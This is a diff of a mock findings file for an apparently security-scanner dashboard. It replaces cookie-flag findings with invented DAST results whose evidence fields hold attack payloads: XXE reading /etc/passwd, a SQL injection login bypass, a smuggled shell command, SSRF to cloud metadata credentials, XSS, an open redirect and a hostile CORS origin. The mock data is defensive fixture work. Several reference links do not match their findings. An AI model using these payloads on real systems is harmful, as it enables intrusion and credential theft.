-    "evidence": "Set-Cookie: AWSALB=VgWwB1DrDcipAUnVMXyByTD7XrzErwDHVlKXUKQAzwWGrNK3kcGWIyZ47DM/0tbnTQUOvZsZ+bT93fNGoaaGfkwFjflBx089qajbJyRhWtrXvErOEzzZvVA3wixD; Expires=Thu, 10 Sep 2026 03:55:56 GMT; Path=/\n[owasp-zap]: Set-Cookie: AWSALBCORS=VgWwB1DrDcipAUnVMXyByTD7XrzErwDHVlKXUKQAzwWGrNK3kcGWIyZ47DM/0tbnTQUOvZsZ+bT93fNGoaaGfkwFjflBx089qajbJyRhWtrXvErOEzzZvVA3wixD; Expires=Thu, 10 Sep 2026 03:55:56 GMT; Path=/; SameSite=None; Secure",
-    "remediation": "Add HttpOnly, Secure, SameSite attributes to the Set-Cookie header.",
-    "references": [
-      "https://owasp.org/www-community/controls/SecureCookieAttribute"
-    ],
-    "cwe": [
-      "CWE-614",
-      "CWE-1004"
-    ],
-    "cves": [],
-    "owasp": [
-      "A07:2021-Identification and Authentication Failures"
-    ],
-    "risk_score": 25.0,
-    "threat_scenario": null,
-    "potential_impact": {},
-    "blast_radius": null,
-    "status": "open",
-    "created_at": "2026-09-03T03:56:01.521522"
-  },
-  {
-    "id": "f8e0fb6d-ba98-4563-9ec4-e8535059e16b",
-    "title": "Insecure Cookie Attribute (HttpOnly, Secure, SameSite) on 'AWSALB'",
-    "description": "The cookie 'AWSALB' is set without the HttpOnly, Secure, SameSite flag(s), allowing potential access via XSS or CSRF.",
-    "severity": "LOW",
-    "confidence": "HIGH",
-    "category": "Session Management",
-    "source": "DAST",
-    "scanner": "owasp-zap",
-    "file": null,
-    "line": null,
-    "code_snippet": null,
-    "endpoint": "/my-account",
-    "method": null,
-    "parameter": null,
-    "evidence": "Set-Cookie: AWSALB=Q+qpXA8fzm3PzK0BHyJRIcxTtqLSqF3uGWB+bX6+UUbG/NoHhpkTAQhbxtIAEI7UGveR9Kh37ZbdNCjsEAj6O6SRAn4RnU4P3pmGnGgDsDac7ajaXaFswUI4+4RN; Expires=Thu, 10 Sep 2026 03:55:56 GMT; Path=/\n[owasp-zap]: Set-Cookie: AWSALBCORS=Q+qpXA8fzm3PzK0BHyJRIcxTtqLSqF3uGWB+bX6+UUbG/NoHhpkTAQhbxtIAEI7UGveR9Kh37ZbdNCjsEAj6O6SRAn4RnU4P3pmGnGgDsDac7ajaXaFswUI4+4RN; Expires=Thu, 10 Sep 2026 03:55:56 GMT; Path=/; SameSite=None; Secure",
-    "remediation": "Add HttpOnly, Secure, SameSite attributes to the Set-Cookie header.",
-    "references": [
-      "https://owasp.org/www-community/controls/SecureCookieAttribute"
-    ],
-    "cwe": [
-      "CWE-614",
-      "CWE-1004"
-    ],
-    "cves": [],
-    "owasp": [
-      "A07:2021-Identification and Authentication Failures"
-    ],
-    "risk_score": 25.0,
-    "threat_scenario": null,
-    "potential_impact": {},
-    "blast_radius": null,
-    "status": "open",
-    "created_at": "2026-09-03T03:56:01.521529"
-  },
-  {
-    "id": "aad83396-0461-4e4b-9496-bdb0022da536",
-    "title": "Insecure Cookie Attribute (HttpOnly, Secure, SameSite) on 'AWSALB'",
-    "description": "The cookie 'AWSALB' is set without the HttpOnly, Secure, SameSite flag(s), allowing potential access via XSS or CSRF.",
-    "severity": "LOW",
-    "confidence": "HIGH",
-    "category": "Session Management",
-    "source": "DAST",
-    "scanner": "owasp-zap",
-    "file": null,
-    "line": null,
-    "code_snippet": null,
-    "endpoint": "/login",
-    "method": null,
-    "parameter": null,
-    "evidence": "Set-Cookie: AWSALB=kNt8pftE1lgonDm0Er0XZPhvEhICo8n2aXyXAJbs9lTTuW9Peih+Yp5vfDQkkkyFOkFQWnxWOanYqgk1Ap99lQNzwlXGIYGdSUGRuE7x6VhsgaYGKcidSQ5THzga; Expires=Thu, 10 Sep 2026 03:55:57 GMT; Path=/\n[owasp-zap]: Set-Cookie: AWSALBCORS=kNt8pftE1lgonDm0Er0XZPhvEhICo8n2aXyXAJbs9lTTuW9Peih+Yp5vfDQkkkyFOkFQWnxWOanYqgk1Ap99lQNzwlXGIYGdSUGRuE7x6VhsgaYGKcidSQ5THzga; Expires=Thu, 10 Sep 2026 03:55:57 GMT; Path=/; SameSite=None; Secure",
-    "remediation": "Add HttpOnly, Secure, SameSite attributes to the Set-Cookie header.",
-    "references": [
-      "https://owasp.org/www-community/controls/SecureCookieAttribute"
-    ],
-    "cwe": [
-      "CWE-614",
-      "CWE-1004"
-    ],
-    "cves": [],
-    "owasp": [
-      "A07:2021-Identification and Authentication Failures"
-    ],
-    "risk_score": 25.0,
-    "threat_scenario": null,
-    "potential_impact": {},
-    "blast_radius": null,
-    "status": "open",
-    "created_at": "2026-09-03T03:56:01.521531"
-  },
-  {
-    "id": "d7e9067f-0ce2-4c3e-96fe-bb4445bb233f",
-    "title": "Insecure Cookie Attribute (HttpOnly, Secure, SameSite) on 'AWSALB'",
-    "description": "The cookie 'AWSALB' is set without the HttpOnly, Secure, SameSite flag(s), allowing potential access via XSS or CSRF.",
-    "severity": "LOW",
-    "confidence": "HIGH",
-    "category": "Session Management",
-    "source": "DAST",
-    "scanner": "owasp-zap",
-    "file": null,
-    "line": null,
-    "code_snippet": null,
-    "endpoint": "/catalog/cart",
-    "method": null,
-    "parameter": null,
-    "evidence": "Set-Cookie: AWSALB=gn/2ycMIYRyUywhVqSD1chGtS2WRfk+c6gosaVxtgR0F493I9WMxWy/6Xfaedq+DZorNPYFi70u85il0FZnFOb+2nHd+k/G9PwoZehwnXqDgYz1CYsxzZwk046/l; Expires=Thu, 10 Sep 2026 03:55:57 GMT; Path=/\n[owasp-zap]: Set-Cookie: AWSALBCORS=gn/2ycMIYRyUywhVqSD1chGtS2WRfk+c6gosaVxtgR0F493I9WMxWy/6Xfaedq+DZorNPYFi70u85il0FZnFOb+2nHd+k/G9PwoZehwnXqDgYz1CYsxzZwk046/l; Expires=Thu, 10 Sep 2026 03:55:57 GMT; Path=/; SameSite=None; Secure",
-    "remediation": "Add HttpOnly, Secure, SameSite attributes to the Set-Cookie header.",
-    "references": [
-      "https://owasp.org/www-community/controls/SecureCookieAttribute"
-    ],
-    "cwe": [
-      "CWE-614",
-      "CWE-1004"
-    ],
-    "cves": [],
-    "owasp": [
-      "A07:2021-Identification and Authentication Failures"
-    ],
-    "risk_score": 25.0,
-    "threat_scenario": null,
-    "potential_impact": {},
-    "blast_radius": null,
-    "status": "open",
-    "created_at": "2026-09-03T03:56:01.521534"
-  },
-  {
-    "id": "592a3fc2-bcea-4a3b-8533-2acca68e744e",
-    "title": "Insecure Cookie Attribute (HttpOnly, Secure, SameSite) on 'AWSALB'",
-    "description": "The cookie 'AWSALB' is set without the HttpOnly, Secure, SameSite flag(s), allowing potential access via XSS or CSRF.",
-    "severity": "LOW",
-    "confidence": "HIGH",
-    "category": "Session Management",
-    "source": "DAST",
-    "scanner": "owasp-zap",
-    "file": null,
-    "line": null,
-    "code_snippet": null,
-    "endpoint": "/catalog/product",
-    "method": null,
-    "parameter": null,
-    "evidence": "Set-Cookie: AWSALB=Mpwo/AWrHSsUdomsmTZPxTgLD5BxLe+h6HKCFRslKy5Wm5UB9WQD05SGw8AScHkcPrFg/2akN7Kt3IJNuKB9KIkA3Sq8s4J6gmrBLYOt91MUU75I0uRGd6mZ3Agx; Expires=Thu, 10 Sep 2026 03:55:57 GMT; Path=/\n[owasp-zap]: Set-Cookie: AWSALBCORS=Mpwo/AWrHSsUdomsmTZPxTgLD5BxLe+h6HKCFRslKy5Wm5UB9WQD05SGw8AScHkcPrFg/2akN7Kt3IJNuKB9KIkA3Sq8s4J6gmrBLYOt91MUU75I0uRGd6mZ3Agx; Expires=Thu, 10 Sep 2026 03:55:57 GMT; Path=/; SameSite=None; Secure\n[owasp-zap]: Set-Cookie: AWSALB=Qzxx2V3owOyhjVLnXMUPejEpvEuflApyUmgvw1ZslCDAHA7rTyxEj45p9BnOdpLYlRMGCAEPDkcaI4HisqUhRAyfcqRk222MfMuCOxiSX929+vQ8ZgiOut75Eqjs; Expires=Thu, 10 Sep 2026 03:55:58 GMT; Path=/\n[owasp-zap]: Set-Cookie: AWSALBCORS=Qzxx2V3owOyhjVLnXMUPejEpvEuflApyUmgvw1ZslCDAHA7rTyxEj45p9BnOdpLYlRMGCAEPDkcaI4HisqUhRAyfcqRk222MfMuCOxiSX929+vQ8ZgiOut75Eqjs; Expires=Thu, 10 Sep 2026 03:55:58 GMT; Path=/; SameSite=None; Secure\n[owasp-zap]: Set-Cookie: AWSALB=b1QWDA7h/pxOxIgrA3mjhdMmF3h9bKqiyGCQx7ITblspvfalQ1Lyqy2gVHBZEYaacnuLnJxYW74QgKl22zYLEwjB2p+Lu3f58RY5A4ts6lLQTlvClrBzHUHIgWiZ; Expires=Thu, 10 Sep 2026 03:55:58 GMT; Path=/\n[owasp-zap]: Set-Cookie: AWSALBCORS=b1QWDA7h/pxOxIgrA3mjhdMmF3h9bKqiyGCQx7ITblspvfalQ1Lyqy2gVHBZEYaacnuLnJxYW74QgKl22zYLEwjB2p+Lu3f58RY5A4ts6lLQTlvClrBzHUHIgWiZ; Expires=Thu, 10 Sep 2026 03:55:58 GMT; Path=/; SameSite=None; Secure",
-    "remediation": "Add HttpOnly, Secure, SameSite attributes to the Set-Cookie header.",
-    "references": [
-      "https://owasp.org/www-community/controls/SecureCookieAttribute"
-    ],
-    "cwe": [
-      "CWE-614",
-      "CWE-1004"
-    ],
-    "cves": [],
-    "owasp": [
-      "A07:2021-Identification and Authentication Failures"
-    ],
-    "risk_score": 25.0,
-    "threat_scenario": null,
-    "potential_impact": {},
-    "blast_radius": null,
-    "status": "open",
-    "created_at": "2026-09-03T03:56:01.521536"
-  },
-  {
-    "id": "2c287f92-e7f2-45eb-8b91-7bf4aa0327d9",
-    "title": "Insecure Cookie Attribute (HttpOnly, Secure, SameSite) on 'AWSALB'",
-    "description": "The cookie 'AWSALB' is set without the HttpOnly, Secure, SameSite flag(s), allowing potential access via XSS or CSRF.",
-    "severity": "LOW",
-    "confidence": "HIGH",
-    "category": "Session Management",
-    "source": "DAST",
-    "scanner": "owasp-zap",
-    "file": null,
-    "line": null,
-    "code_snippet": null,
-    "endpoint": "/catalog/product/stock",
-    "method": null,
-    "parameter": null,
-    "evidence": "Set-Cookie: AWSALB=AAyamhw7wjNRp+MObL4s6jU6oem7FA1UVovCrH1/3IGjoio2YFJrnaScByI1axaBoIOATQWhJU6ItOnM9gq7bZf7a31PsFrbJu+ruC+DGOlNP8B1MM0X4dLMj5pv; Expires=Thu, 10 Sep 2026 03:55:57 GMT; Path=/\n[owasp-zap]: Set-Cookie: AWSALBCORS=AAyamhw7wjNRp+MObL4s6jU6oem7FA1UVovCrH1/3IGjoio2YFJrnaScByI1axaBoIOATQWhJU6ItOnM9gq7bZf7a31PsFrbJu+ruC+DGOlNP8B1MM0X4dLMj5pv; Expires=Thu, 10 Sep 2026 03:55:57 GMT; Path=/; SameSite=None; Secure",
-    "remediation": "Add HttpOnly, Secure, SameSite attributes to the Set-Cookie header.",
-    "references": [
-      "https://owasp.org/www-community/controls/SecureCookieAttribute"
-    ],
-    "cwe": [
-      "CWE-614",
-      "CWE-1004"
-    ],
-    "cves": [],
-    "owasp": [
-      "A07:2021-Identification and Authentication Failures"
-    ],
-    "risk_score": 25.0,
-    "threat_scenario": null,
-    "potential_impact": {},
-    "blast_radius": null,
-    "status": "open",
-    "created_at": "2026-09-03T03:56:01.521537"
-  },
-  {
-    "id": "5b8040e3-630c-4b43-8cc3-ccc1eb65076f",
-    "title": "Missing Clickjacking Defense (X-Frame-Options / CSP frame-ancestors)",
-    "description": "The target web page does not enforce frame embedding restrictions, leaving users vulnerable to UI redressing (Clickjacking).",
-    "severity": "MEDIUM",
-    "confidence": "HIGH",
-    "category": "Broken Access Control",
-    "source": "DAST",
-    "scanner": "owasp-zap",
-    "file": null,
-    "line": null,
-    "code_snippet": null,
-    "endpoint": "/catalog/product/stock",
-    "method": null,
-    "parameter": null,
-    "evidence": "No 'X-Frame-Options' header or CSP 'frame-ancestors' directive detected in HTTP response.",
-    "remediation": "Set `X-Frame-Options: DENY` or `Content-Security-Policy: frame-ancestors 'none'`.",
-    "references": [
-      "https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html"
     ],
     "cwe": [
       "CWE-1021"
@@ -1723,7 +1390,313 @@ export const mockFindings = [
     "owasp": [
       "A05:2021-Security Misconfiguration"
     ],
-    "risk_score": 50.0,
+    "risk_score": 34.0,
+    "threat_scenario": null,
+    "potential_impact": {},
+    "blast_radius": null,
+    "status": "open",
+    "created_at": "2026-09-03T03:56:01.521508"
+  },
+  {
+    "id": "869b88d1-03bf-41ea-9a62-01f188170e32",
+    "title": "Missing Clickjacking Defense (X-Frame-Options / CSP frame-ancestors)",
+    "description": "Sensitive settings page can be embedded inside third-party iframes, enabling UI redressing and clickjacking attacks against authenticated users.",
+    "severity": "LOW",
+    "confidence": "HIGH",
+    "category": "Security Misconfiguration",
+    "source": "DAST",
+    "scanner": "owasp-zap",
+    "file": null,
+    "line": null,
+    "code_snippet": null,
+    "endpoint": "/settings/security",
+    "method": null,
+    "parameter": null,
+    "evidence": "GET /settings/security HTTP/1.1\nHost: target-app.internal\n\nHTTP/1.1 200 OK\nContent-Type: text/html\n\n[OWASP ZAP Finding]: X-Frame-Options / frame-ancestors header is absent. Page can be embedded in malicious iframes.",
+    "remediation": "Set X-Frame-Options: DENY or Content-Security-Policy: frame-ancestors 'none' to prevent framing.",
+    "references": [
+      "https://owasp.org/www-community/controls/SecureCookieAttribute"
+    ],
+    "cwe": [
+      "CWE-1021"
+    ],
+    "cves": [],
+    "owasp": [
+      "A05:2021-Security Misconfiguration"
+    ],
+    "risk_score": 32.0,
+    "threat_scenario": null,
+    "potential_impact": {},
+    "blast_radius": null,
+    "status": "open",
+    "created_at": "2026-09-03T03:56:01.521514"
+  },
+  {
+    "id": "0d1a94d4-ec6f-4c09-ac89-db3a5f608b77",
+    "title": "XML External Entity (XXE) Injection in Document Processor",
+    "description": "Document upload endpoint parses XML input with external entity resolution enabled, allowing arbitrary file retrieval and SSRF.",
+    "severity": "HIGH",
+    "confidence": "HIGH",
+    "category": "XML External Entity",
+    "source": "DAST",
+    "scanner": "owasp-zap",
+    "file": null,
+    "line": null,
+    "code_snippet": null,
+    "endpoint": "/api/v1/documents/parse",
+    "method": null,
+    "parameter": null,
+    "evidence": "POST /api/v1/documents/parse HTTP/1.1\nHost: target-app.internal\nContent-Type: application/xml\n\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n<document><data>&xxe;</data></document>\n\nHTTP/1.1 200 OK\nContent-Type: text/plain\n\nroot:x:0:0:root:/root:/bin/bash",
+    "remediation": "Disable XML external entity resolution (DOCTYPE / DTD parsing) in XML parser configurations.",
+    "references": [
+      "https://owasp.org/www-community/controls/SecureCookieAttribute"
+    ],
+    "cwe": [
+      "CWE-611"
+    ],
+    "cves": [],
+    "owasp": [
+      "A05:2021-Security Misconfiguration"
+    ],
+    "risk_score": 84.0,
+    "threat_scenario": null,
+    "potential_impact": {},
+    "blast_radius": null,
+    "status": "open",
+    "created_at": "2026-09-03T03:56:01.521516"
+  },
+  {
+    "id": "bc962568-76bf-4393-a325-3f5da98141ad",
+    "title": "Open URL Redirection on User Logout",
+    "description": "Logout parameter redirects users to untrusted external URLs without origin validation, enabling credential harvesting phishing attacks.",
+    "severity": "MEDIUM",
+    "confidence": "HIGH",
+    "category": "Broken Access Control",
+    "source": "DAST",
+    "scanner": "owasp-zap",
+    "file": null,
+    "line": null,
+    "code_snippet": null,
+    "endpoint": "/auth/logout?redirect_to=",
+    "method": null,
+    "parameter": null,
+    "evidence": "GET /auth/logout?redirect_to=https://evil-phishing.com HTTP/1.1\nHost: target-app.internal\n\nHTTP/1.1 302 Found\nLocation: https://evil-phishing.com",
+    "remediation": "Validate redirect URLs against an internal whitelist or only permit relative path redirects.",
+    "references": [
+      "https://owasp.org/www-community/controls/SecureCookieAttribute"
+    ],
+    "cwe": [
+      "CWE-601"
+    ],
+    "cves": [],
+    "owasp": [
+      "A01:2021-Broken Access Control"
+    ],
+    "risk_score": 55.0,
+    "threat_scenario": null,
+    "potential_impact": {},
+    "blast_radius": null,
+    "status": "open",
+    "created_at": "2026-09-03T03:56:01.521522"
+  },
+  {
+    "id": "f8e0fb6d-ba98-4563-9ec4-e8535059e16b",
+    "title": "Runtime SQL Injection in Authentication Endpoint",
+    "description": "Active blackbox injection fuzzing on the login authentication endpoint revealed unescaped SQL syntax errors and full authentication bypass via boolean SQL injection payloads.",
+    "severity": "CRITICAL",
+    "confidence": "HIGH",
+    "category": "SQL Injection",
+    "source": "DAST",
+    "scanner": "owasp-zap",
+    "file": null,
+    "line": null,
+    "code_snippet": null,
+    "endpoint": "/api/v1/auth/login",
+    "method": null,
+    "parameter": null,
+    "evidence": "POST /api/v1/auth/login HTTP/1.1\nHost: target-app.internal\nContent-Type: application/json\n\n{ \"username\": \"admin' OR 1=1--\", \"password\": \"random_password\" }\n\nHTTP/1.1 200 OK\nContent-Type: application/json\nSet-Cookie: auth_token=eyJhbGciOi...\n\n{\"status\": \"authenticated\", \"role\": \"superadmin\"}",
+    "remediation": "Use parameterized queries or prepared statements: db.query(\"SELECT * FROM users WHERE username = ? AND password = ?\", [username, password]);",
+    "references": [
+      "https://owasp.org/www-community/controls/SecureCookieAttribute"
+    ],
+    "cwe": [
+      "CWE-89"
+    ],
+    "cves": [],
+    "owasp": [
+      "A03:2021-Injection"
+    ],
+    "risk_score": 98.0,
+    "threat_scenario": null,
+    "potential_impact": {},
+    "blast_radius": null,
+    "status": "open",
+    "created_at": "2026-09-03T03:56:01.521529"
+  },
+  {
+    "id": "aad83396-0461-4e4b-9496-bdb0022da536",
+    "title": "Remote Command Execution via Server Diagnostics",
+    "description": "Active injection probe into diagnostics ping parameter allowed execution of arbitrary operating system commands with container root privileges.",
+    "severity": "CRITICAL",
+    "confidence": "HIGH",
+    "category": "Command Injection",
+    "source": "DAST",
+    "scanner": "owasp-zap",
+    "file": null,
+    "line": null,
+    "code_snippet": null,
+    "endpoint": "/api/v1/admin/diagnostics/ping",
+    "method": null,
+    "parameter": null,
+    "evidence": "POST /api/v1/admin/diagnostics/ping HTTP/1.1\nHost: target-app.internal\nContent-Type: application/json\n\n{ \"host\": \"127.0.0.1; id; cat /etc/passwd\" }\n\nHTTP/1.1 200 OK\nContent-Type: text/plain\n\nuid=0(root) gid=0(root) groups=0(root)\nroot:x:0:0:root:/root:/bin/bash",
+    "remediation": "Avoid invoking the system shell. Use execFile() or spawn() with argument arrays rather than concatenating user input into shell strings.",
+    "references": [
+      "https://owasp.org/www-community/controls/SecureCookieAttribute"
+    ],
+    "cwe": [
+      "CWE-78"
+    ],
+    "cves": [],
+    "owasp": [
+      "A03:2021-Injection"
+    ],
+    "risk_score": 97.0,
+    "threat_scenario": null,
+    "potential_impact": {},
+    "blast_radius": null,
+    "status": "open",
+    "created_at": "2026-09-03T03:56:01.521531"
+  },
+  {
+    "id": "d7e9067f-0ce2-4c3e-96fe-bb4445bb233f",
+    "title": "Server-Side Request Forgery (SSRF) in Webhook Dispatcher",
+    "description": "Outgoing webhook subscription accepts unvalidated internal IP addresses, allowing attacker payloads to extract AWS cloud metadata tokens (169.254.169.254).",
+    "severity": "HIGH",
+    "confidence": "HIGH",
+    "category": "Server-Side Request Forgery",
+    "source": "DAST",
+    "scanner": "owasp-zap",
+    "file": null,
+    "line": null,
+    "code_snippet": null,
+    "endpoint": "/api/v1/webhooks/subscribe",
+    "method": null,
+    "parameter": null,
+    "evidence": "POST /api/v1/webhooks/subscribe HTTP/1.1\nHost: target-app.internal\nContent-Type: application/json\n\n{ \"callback_url\": \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\" }\n\nHTTP/1.1 200 OK\n\n{\"roleName\": \"production-ecs-task-role\", \"AccessKeyId\": \"AKIA...\", \"SecretAccessKey\": \"...\"}",
+    "remediation": "Validate destination URLs against an explicit domain whitelist. Resolve hostnames and block private IP ranges (127.0.0.1, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.169.254).",
+    "references": [
+      "https://owasp.org/www-community/controls/SecureCookieAttribute"
+    ],
+    "cwe": [
+      "CWE-918"
+    ],
+    "cves": [],
+    "owasp": [
+      "A10:2021-Server-Side Request Forgery"
+    ],
+    "risk_score": 87.0,
+    "threat_scenario": null,
+    "potential_impact": {},
+    "blast_radius": null,
+    "status": "open",
+    "created_at": "2026-09-03T03:56:01.521534"
+  },
+  {
+    "id": "592a3fc2-bcea-4a3b-8533-2acca68e744e",
+    "title": "Reflected Cross-Site Scripting (XSS) via Search Query",
+    "description": "Payload delivered in query string parameter is reflected directly into HTML DOM without escaping, enabling arbitrary JavaScript execution in victim browsers.",
+    "severity": "HIGH",
+    "confidence": "HIGH",
+    "category": "Cross-Site Scripting",
+    "source": "DAST",
+    "scanner": "owasp-zap",
+    "file": null,
+    "line": null,
+    "code_snippet": null,
+    "endpoint": "/search?q=",
+    "method": null,
+    "parameter": null,
+    "evidence": "GET /search?q=%3Cscript%3Ealert(document.domain)%3C/script%3E HTTP/1.1\nHost: target-app.internal\n\nHTTP/1.1 200 OK\nContent-Type: text/html\n\n<div class=\"search-results\">Results for: <script>alert(document.domain)</script></div>",
+    "remediation": "Ensure all user input rendered into HTML responses is properly contextual HTML entity encoded.",
+    "references": [
+      "https://owasp.org/www-community/controls/SecureCookieAttribute"
+    ],
+    "cwe": [
+      "CWE-79"
+    ],
+    "cves": [],
+    "owasp": [
+      "A03:2021-Injection"
+    ],
+    "risk_score": 78.0,
+    "threat_scenario": null,
+    "potential_impact": {},
+    "blast_radius": null,
+    "status": "open",
+    "created_at": "2026-09-03T03:56:01.521536"
+  },
+  {
+    "id": "2c287f92-e7f2-45eb-8b91-7bf4aa0327d9",
+    "title": "Broken Object-Level Authorization (IDOR) on Invoices",
+    "description": "Authenticated user can access competitor invoice records by modifying the numeric invoice_id parameter in GET requests without permission verification.",
+    "severity": "HIGH",
+    "confidence": "HIGH",
+    "category": "Broken Access Control",
+    "source": "DAST",
+    "scanner": "owasp-zap",
+    "file": null,
+    "line": null,
+    "code_snippet": null,
+    "endpoint": "/api/v1/billing/invoices/1092",
+    "method": null,
+    "parameter": null,
+    "evidence": "GET /api/v1/billing/invoices/1092 HTTP/1.1\nHost: target-app.internal\nAuthorization: Bearer <unauthorized_tenant_token>\n\nHTTP/1.1 200 OK\nContent-Type: application/json\n\n{\"invoice_id\": 1092, \"customer\": \"Competitor Corp\", \"amount_due\": 45000, \"credit_card_last4\": \"4242\"}",
+    "remediation": "Enforce server-side authorization checks comparing user tenant identity against requested object ownership.",
+    "references": [
+      "https://owasp.org/www-community/controls/SecureCookieAttribute"
+    ],
+    "cwe": [
+      "CWE-639"
+    ],
+    "cves": [],
+    "owasp": [
+      "A01:2021-Broken Access Control"
+    ],
+    "risk_score": 82.0,
+    "threat_scenario": null,
+    "potential_impact": {},
+    "blast_radius": null,
+    "status": "open",
+    "created_at": "2026-09-03T03:56:01.521537"
+  },
+  {
+    "id": "5b8040e3-630c-4b43-8cc3-ccc1eb65076f",
+    "title": "Permissive CORS Wildcard with Credentials Allowed",
+    "description": "API preflight responses echo back arbitrary client Origin headers while setting Access-Control-Allow-Credentials to true, allowing unauthorized cross-origin data theft.",
+    "severity": "MEDIUM",
+    "confidence": "HIGH",
+    "category": "Security Misconfiguration",
+    "source": "DAST",
+    "scanner": "owasp-zap",
+    "file": null,
+    "line": null,
+    "code_snippet": null,
+    "endpoint": "/api/v1/user/profile",
+    "method": null,
+    "parameter": null,
+    "evidence": "OPTIONS /api/v1/user/profile HTTP/1.1\nHost: target-app.internal\nOrigin: https://evil-attacker.com\n\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: https://evil-attacker.com\nAccess-Control-Allow-Credentials: true",
+    "remediation": "Do not reflect arbitrary Origin headers when Access-Control-Allow-Credentials is true. Restrict allowed origins to an explicit whitelist.",
+    "references": [
+      "https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html"
+    ],
+    "cwe": [
+      "CWE-942"
+    ],
+    "cves": [],
+    "owasp": [
+      "A05:2021-Security Misconfiguration"
+    ],
+    "risk_score": 68.0,
     "threat_scenario": null,
     "potential_impact": {},
     "blast_radius": null,
@@ -5789,8 +5762,8 @@ export const mockFindings = [
   },
   {
     "id": "870e7450-a0cc-4cf5-9152-5010e5dbdfaa",
-    "title": "Insecure Cookie Attribute (HttpOnly, Secure, SameSite) on 'AWSALB'",
-    "description": "The cookie 'AWSALB' is set without the HttpOnly, Secure, SameSite flag(s), allowing potential access via XSS or CSRF.",
+    "title": "Insecure Cookie Attribute (HttpOnly, Secure, SameSite) on Session Token",
+    "description": "The session cookie is set without the HttpOnly, Secure, SameSite flag(s), allowing potential access via XSS or CSRF.",
     "severity": "LOW",
     "confidence": "HIGH",
     "category": "Session Management",
@@ -5799,17 +5772,16 @@ export const mockFindings = [
     "file": null,
     "line": null,
     "code_snippet": null,
-    "endpoint": "/",
+    "endpoint": "/api/v1/auth/session",
     "method": null,
     "parameter": null,
-    "evidence": "Set-Cookie: AWSALB=yQybRBrdNn69BkAbMNJDCTAV3eSzcOvChR5zucGmL9Hxm4+YUaAwtvoKV4vRzdIbUchmhjMagNxDgoYkbqSjU/j/O22927yrf9D42ig13kr9hsmsUtqb4v5UEzpJ; Expires=Thu, 10 Sep 2026 03:59:22 GMT; Path=/\n[owasp-zap]: Set-Cookie: AWSALBCORS=yQybRBrdNn69BkAbMNJDCTAV3eSzcOvChR5zucGmL9Hxm4+YUaAwtvoKV4vRzdIbUchmhjMagNxDgoYkbqSjU/j/O22927yrf9D42ig13kr9hsmsUtqb4v5UEzpJ; Expires=Thu, 10 Sep 2026 03:59:22 GMT; Path=/; SameSite=None; Secure\n[owasp-zap]: Set-Cookie: AWSALB=bfMgs4vlo/BvwosV53n24fnQn9y2+ShG2nlzx2gMgNf6LCusMticM4XRnDOGKW/oqj6GjC2k3kaREcJ3LroM4ihYvGTqP15IkPeOzg6wb7qWyV/Z+zuqaJxggfSJ; Expires=Thu, 10 Sep 2026 03:59:22 GMT; Path=/\n[owasp-zap]: Set-Cookie: AWSALBCORS=bfMgs4vlo/BvwosV53n24fnQn9y2+ShG2nlzx2gMgNf6LCusMticM4XRnDOGKW/oqj6GjC2k3kaREcJ3LroM4ihYvGTqP15IkPeOzg6wb7qWyV/Z+zuqaJxggfSJ; Expires=Thu, 10 Sep 2026 03:59:22 GMT; Path=/; SameSite=None; Secure",
-    "remediation": "Add HttpOnly, Secure, SameSite attributes to the Set-Cookie header.",
+    "evidence": "HTTP/1.1 200 OK\nSet-Cookie: session_token=eyJhbGciOi...; Path=/; Expires=Thu, 10 Sep 2026 03:41:42 GMT\n\n[OWASP ZAP Finding]: Set-Cookie header missing HttpOnly, Secure, SameSite flags",
+    "remediation": "Add HttpOnly, Secure, and SameSite=Lax (or Strict) attributes to all Set-Cookie headers.",
     "references": [
       "https://owasp.org/www-community/controls/SecureCookieAttribute"
     ],
     "cwe": [
-      "CWE-614",
-      "CWE-1004"
+      "CWE-614"
     ],
     "cves": [],
     "owasp": [
@@ -5824,33 +5796,32 @@ export const mockFindings = [
   },
   {
     "id": "74d98b7f-560d-42f1-ae8d-3111fee4a3d8",
-    "title": "Insecure Cookie Attribute (HttpOnly, Secure, SameSite) on 'AWSALB'",
-    "description": "The cookie 'AWSALB' is set without the HttpOnly, Secure, SameSite flag(s), allowing potential access via XSS or CSRF.",
+    "title": "Missing HTTP Strict Transport Security (HSTS) Header",
+    "description": "Application fails to enforce HTTPS connections via HSTS response header, allowing man-in-the-middle attackers to downgrade connections to plaintext HTTP.",
     "severity": "LOW",
     "confidence": "HIGH",
-    "category": "Session Management",
+    "category": "Cryptographic Failures",
     "source": "DAST",
     "scanner": "owasp-zap",
     "file": null,
     "line": null,
     "code_snippet": null,
-    "endpoint": "/catalog",
+    "endpoint": "/",
     "method": null,
     "parameter": null,
-    "evidence": "Set-Cookie: AWSALB=HSp/1X0d83OI77bMpCH+cBKblJLfxUcPVvdLzsegRZHgceCDRsrR9051QbwNYf2BuNE1W+IMNx6ooqK/zhp/cUpgf2WOByw1GYLjSIgqwefK62tlRIsQVYts+tUF; Expires=Thu, 10 Sep 2026 03:59:22 GMT; Path=/\n[owasp-zap]: Set-Cookie: AWSALBCORS=HSp/1X0d83OI77bMpCH+cBKblJLfxUcPVvdLzsegRZHgceCDRsrR9051QbwNYf2BuNE1W+IMNx6ooqK/zhp/cUpgf2WOByw1GYLjSIgqwefK62tlRIsQVYts+tUF; Expires=Thu, 10 Sep 2026 03:59:22 GMT; Path=/; SameSite=None; Secure\n[owasp-zap]: Set-Cookie: TrackingId=eyJ0eXBlIjoiY2xhc3MiLCJ2YWx1ZSI6IjZlc2EyRXR0VkdvMnhjbG4ifQ==; Secure; HttpOnly",
-    "remediation": "Add HttpOnly, Secure, SameSite attributes to the Set-Cookie header.",
+    "evidence": "GET / HTTP/1.1\nHost: target-app.internal\n\nHTTP/1.1 200 OK\nContent-Type: text/html\n\n[OWASP ZAP Finding]: Strict-Transport-Security header is absent in response headers.",
+    "remediation": "Add Strict-Transport-Security: max-age=31536000; includeSubDomains; preload header to all HTTPS responses.",
     "references": [
       "https://owasp.org/www-community/controls/SecureCookieAttribute"
     ],
     "cwe": [
-      "CWE-614",
-      "CWE-1004"
+      "CWE-319"
     ],
     "cves": [],
     "owasp": [
-      "A07:2021-Identification and Authentication Failures"
+      "A05:2021-Security Misconfiguration"
     ],
